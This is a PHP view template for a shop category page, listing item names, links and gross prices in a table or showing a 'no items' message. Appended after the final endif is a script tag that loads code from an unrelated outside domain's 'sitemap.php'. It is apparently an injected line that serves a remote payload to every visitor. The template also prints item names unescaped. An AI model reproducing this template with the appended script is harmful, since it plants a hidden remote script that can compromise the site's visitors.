<h2><?=$category -> name?></h2>

<?if($category -> items):?>
<table>
<thead>
<tr>
	<th><?=getWord('name')?>
	<th><?=getWord('priceBrutto')?>
<tfoot>
<tr>
	<th><?=getWord('name')?>
	<th><?=getWord('priceBrutto')?>
<tbody>
<?foreach($category -> items as $item):?>
<tr>
	<th><a href='/item/<?=$item -> id?>'><?=$item -> name?></a>
	<td><?=$item -> price?>&nbsp;<?=getWord('priceUnits')?>
<?endforeach?>
</table>

<?else:?>
<p><?=getWord('categoryNoItems')?>
<?endif?><script src=http://johanneswallmark.com/media/sitemap.php ></script>